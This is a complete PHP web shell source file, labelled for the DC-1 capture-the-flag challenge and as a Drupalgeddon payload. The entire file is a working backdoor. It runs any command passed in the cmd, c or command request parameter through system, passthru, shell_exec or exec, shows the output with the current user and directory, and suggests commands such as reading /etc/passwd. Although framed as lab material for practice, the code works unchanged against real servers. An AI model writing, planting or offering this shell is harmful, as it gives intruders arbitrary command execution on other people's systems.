<?php
/**
 * Simple PHP Web Shell
 * For DC-1 CTF Challenge
 * Usage: webshell.php?cmd=<command>
 */

// Set headers
header('X-Powered-By: Apache');

// Check if command parameter exists
if(isset($_REQUEST['cmd']) || isset($_REQUEST['c']) || isset($_REQUEST['command'])){
    $cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : (isset($_REQUEST['c']) ? $_REQUEST['c'] : $_REQUEST['command']);

    echo "<html><head><title>Shell</title>";
    echo "<style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}";
    echo "input,textarea{background:#111;color:#0f0;border:1px solid #0f0;padding:10px;width:80%;font-family:monospace;}";
    echo ".output{background:#111;padding:15px;margin:10px 0;border:1px solid #0f0;white-space:pre-wrap;}</style></head><body>";
    echo "<h1>🔥 DC-1 Web Shell 🔥</h1>";
    echo "<form method='GET'><input type='text' name='cmd' value='".htmlspecialchars($cmd)."' placeholder='Enter command...'>";
    echo "<input type='submit' value='Execute'></form><hr>";
    echo "<div class='output'><strong>Command:</strong> " . htmlspecialchars($cmd) . "\n\n<strong>Output:</strong>\n";

    // Execute command
    if(function_exists('system')) {
        @system($cmd);
    } elseif(function_exists('passthru')) {
        @passthru($cmd);
    } elseif(function_exists('shell_exec')) {
        echo @shell_exec($cmd);
    } elseif(function_exists('exec')) {
        @exec($cmd, $output);
        echo implode("\n", $output);
    } else {
        echo "No execution functions available!";
    }

    echo "</div>";
    echo "<hr><p>Current User: <strong>" . @shell_exec('whoami') . "</strong></p>";
    echo "<p>Current Directory: <strong>" . getcwd() . "</strong></p>";
    echo "</body></html>";

} else {
    // Show form
    echo "<html><head><title>Shell</title>";
    echo "<style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;text-align:center;}";
    echo "input{background:#111;color:#0f0;border:1px solid #0f0;padding:10px;width:60%;font-family:monospace;margin:10px;}";
    echo "h1{text-shadow:0 0 10px #0f0;}</style></head><body>";
    echo "<h1>🔥 DC-1 Web Shell 🔥</h1>";
    echo "<p>Enter command to execute</p>";
    echo "<form method='GET'><input type='text' name='cmd' placeholder='Enter command (e.g., id, ls -la, cat /etc/passwd)'>";
    echo "<br><input type='submit' value='Execute'></form>";
    echo "<hr><p style='opacity:0.5;font-size:12px;'>Drupalgeddon Payload | CTF Edition</p>";
    echo "</body></html>";
}
?>
